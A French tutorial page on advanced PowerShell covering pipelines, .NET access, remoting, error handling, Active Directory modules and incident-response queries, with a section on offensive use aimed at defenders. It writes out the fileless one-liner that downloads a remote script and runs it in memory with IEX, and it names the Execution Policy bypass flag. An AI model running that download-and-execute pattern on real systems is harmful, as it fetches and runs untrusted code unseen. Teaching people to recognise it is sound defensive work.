---
id: 02-powershell-avance
title: PowerShell - Avancé
sidebar_position: 2
---

# PowerShell — Avancé

Les bases (objets, cmdlets, pipeline) étant acquises, on aborde ce qui fait de PowerShell un outil d'administration et de sécurité puissant sur Windows — et un outil offensif redoutable qu'il faut comprendre pour défendre.

## Le pipeline en profondeur : $_ et les blocs de script

Dans un pipeline, chaque objet passe à travers un **bloc de script** (`{ ... }`) où `$_` (ou `$PSItem`) le représente :

```powershell
# Filtrage avec expression complexe
Get-Process | Where-Object { $_.CPU -gt 100 -and $_.Name -like "chrome*" }

# Transformation avec calcul
Get-ChildItem *.log | ForEach-Object {
    [PSCustomObject]@{
        Nom     = $_.Name
        TailleMB = [math]::Round($_.Length / 1MB, 2)
        Age     = (Get-Date) - $_.LastWriteTime
    }
}
```

Le `[PSCustomObject]@{...}` crée un objet sur mesure — c'est ainsi qu'on construit des rapports structurés qu'on pourra ensuite trier, filtrer, exporter en CSV/JSON. C'est un pattern central : transformer des données brutes en objets propres.

Les propriétés calculées dans `Select-Object` sont une variante compacte :

```powershell
Get-Process | Select-Object Name,
    @{Name="MémoireMB"; Expression={[math]::Round($_.WorkingSet/1MB, 2)}} |
    Sort-Object MémoireMB -Descending
```

## Accès à .NET : la vraie puissance

PowerShell est bâti sur **.NET**. Ça veut dire que tu as accès à toute la bibliothèque .NET directement, ce qui ouvre des possibilités énormes bien au-delà des cmdlets :

```powershell
# Classes .NET statiques avec [Namespace.Classe]::Méthode()
[System.Math]::Sqrt(144)                    # 12
[System.Guid]::NewGuid()                    # génère un GUID
[System.Net.Dns]::GetHostAddresses("google.com")   # résolution DNS
[System.IO.File]::ReadAllText("C:\fichier.txt")

# Instancier des objets .NET avec New-Object ou [Classe]::new()
$client = [System.Net.Sockets.TcpClient]::new()
$client.Connect("192.168.1.1", 445)
$client.Connected                            # test de port en .NET pur

# Encodage / décodage
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("secret"))
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
```

Cet accès .NET est exactement ce qui rend PowerShell si puissant en sécurité : cryptographie, sockets réseau bas niveau, manipulation de mémoire, appels Win32 API — tout est accessible. C'est aussi pourquoi les attaquants s'en servent (voir plus bas).

## Remoting : administrer à distance

PowerShell Remoting (basé sur WinRM) permet d'exécuter des commandes sur des machines distantes — l'épine dorsale de l'administration Windows à grande échelle :

```powershell
# Exécution unique sur une machine distante
Invoke-Command -ComputerName SRV01 -ScriptBlock { Get-Service | Where-Object Status -eq "Running" }

# Sur plusieurs machines en parallèle
Invoke-Command -ComputerName SRV01, SRV02, SRV03 -ScriptBlock { hostname; Get-Date }

# Session interactive
Enter-PSSession -ComputerName SRV01

# Session persistante réutilisable
$session = New-PSSession -ComputerName SRV01
Invoke-Command -Session $session -ScriptBlock { $cache = Get-Process }
Invoke-Command -Session $session -ScriptBlock { $cache.Count }   # la variable persiste
```

Côté sécurité, le Remoting est à double tranchant : outil légitime d'admin, mais aussi vecteur de **mouvement latéral** en attaque (une fois des identifiants obtenus, `Invoke-Command` permet de pivoter d'une machine à l'autre). Comprendre son fonctionnement aide à détecter les usages malveillants dans les logs.

## Gestion d'erreurs robuste

Deux types d'erreurs en PowerShell : **terminating** (arrêtent l'exécution) et **non-terminating** (affichent une erreur mais continuent). Le piège classique : `try/catch` n'attrape que les terminating. Pour capturer une erreur non-terminating, force-la en terminating avec `-ErrorAction Stop` :

```powershell
try {
    $contenu = Get-Content "fichier_inexistant.txt" -ErrorAction Stop
}
catch [System.IO.FileNotFoundException] {
    Write-Warning "Fichier introuvable : $($_.Exception.Message)"
}
catch {
    Write-Error "Erreur inattendue : $_"
}
finally {
    Write-Output "Nettoyage éventuel ici"
}

# Variable de préférence globale
$ErrorActionPreference = "Stop"   # rend TOUTES les erreurs terminating (comme set -e en Bash)
```

`$ErrorActionPreference = "Stop"` en tête de script est l'équivalent PowerShell du `set -e` de Bash : ça transforme les erreurs silencieuses en arrêts francs, ce qui évite qu'un script continue dans un état incohérent.

## Modules et réutilisation

Un **module** regroupe des fonctions réutilisables. Pour organiser ton code au-delà d'un script isolé :

```powershell
# Importer un module
Import-Module ActiveDirectory        # le module AD (admin de domaine)
Get-Module -ListAvailable            # voir les modules installés

# Installer depuis la PowerShell Gallery
Install-Module -Name PSWindowsUpdate

# Créer ton propre module : un fichier MonModule.psm1 avec des fonctions
# puis Import-Module .\MonModule.psm1
```

Le module **ActiveDirectory** est central en administration Windows d'entreprise (et en pentest AD) : `Get-ADUser`, `Get-ADComputer`, `Get-ADGroupMember` permettent d'énumérer tout un annuaire. C'est un des premiers réflexes en reconnaissance sur un domaine.

## Cas d'usage sécurité / admin système

Quelques patterns concrets pour ton domaine :

```powershell
# Auditer les connexions réseau actives (équivalent netstat, en objets)
Get-NetTCPConnection | Where-Object State -eq "Established" |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess

# Croiser connexions et processus (quel programme parle au réseau ?)
Get-NetTCPConnection -State Established | ForEach-Object {
    $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        Distant = "$($_.RemoteAddress):$($_.RemotePort)"
        Process = $proc.Name
        PID     = $_.OwningProcess
    }
}

# Chercher dans le journal d'événements Windows (réponse à incident)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 20   # échecs de connexion
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 20   # connexions réussies

# Lister les tâches planifiées (persistance courante des malwares)
Get-ScheduledTask | Where-Object State -eq "Ready" | Select-Object TaskName, TaskPath
```

L'ID d'événement **4625** (échec d'authentification) est un classique pour détecter du brute force ; **4624** pour tracer les connexions. `Get-WinEvent` avec un `FilterHashtable` est bien plus rapide que de tout récupérer puis filtrer. Ce sont des réflexes de blue team / réponse à incident.

## Le côté offensif (à comprendre pour défendre)

PowerShell est l'outil offensif n°1 sur Windows, pour de bonnes raisons : installé partout, accès total à .NET et Win32, et capable de s'exécuter **en mémoire sans toucher le disque** (fileless), ce qui échappe aux antivirus classiques. Tu dois connaître ces techniques pour les détecter.

```powershell
# Exécution en mémoire depuis le réseau (technique fileless typique)
IEX (New-Object Net.WebClient).DownloadString('http://serveur/script.ps1')
# IEX = Invoke-Expression : exécute une chaîne comme du code
```

Ce one-liner `IEX (DownloadString(...))` est LE pattern à reconnaître : il télécharge du code et l'exécute directement en mémoire. Des frameworks comme **PowerSploit**, **Empire** ou **Nishang** l'utilisent massivement.

Les défenses côté Windows que tu dois connaître :

- **Execution Policy** — `Restricted`, `RemoteSigned`, etc. Ce n'est **PAS une barrière de sécurité** (contournable trivialement par `-ExecutionPolicy Bypass` ou en piped depuis stdin), juste un garde-fou contre les exécutions accidentelles. Ne t'y fie jamais comme protection.
- **Script Block Logging** — journalise tout code PowerShell exécuté, même obfusqué et même en mémoire (événements 4104). C'est la vraie défense : elle rend le fileless visible.
- **Constrained Language Mode** — restreint l'accès à .NET, cassant la plupart des outils offensifs.
- **AMSI** (Antimalware Scan Interface) — scanne le code au moment de l'exécution, y compris ce qui est déobfusqué en mémoire.

Comprendre l'attaque (`IEX`, obfuscation, fileless) et la défense (logging, AMSI, CLM) est exactement le genre de connaissance à double usage qui compte en cybersécu.

## Ce qu'il faut retenir

- Dans le pipeline, `$_` représente l'objet courant ; `[PSCustomObject]@{...}` construit des objets propres pour des rapports structurés.
- L'accès complet à **.NET** (`[Namespace.Classe]::Méthode()`) débloque cryptographie, sockets, encodage, Win32 — c'est la vraie puissance de PowerShell.
- Le **Remoting** (`Invoke-Command`, `New-PSSession`) administre à distance et à grande échelle — aussi un vecteur de mouvement latéral en attaque.
- Gère les erreurs avec `try/catch` + `-ErrorAction Stop` (ou `$ErrorActionPreference = "Stop"`, l'équivalent de `set -e`).
- Le module **ActiveDirectory** énumère tout un domaine — central en admin comme en pentest AD.
- Réflexes blue team : `Get-NetTCPConnection`, `Get-WinEvent` (ID 4624/4625), `Get-ScheduledTask`.
- Côté offensif : reconnais le pattern `IEX (DownloadString(...))` (fileless) ; sache que l'Execution Policy **n'est pas** une sécurité, mais que Script Block Logging + AMSI le sont.
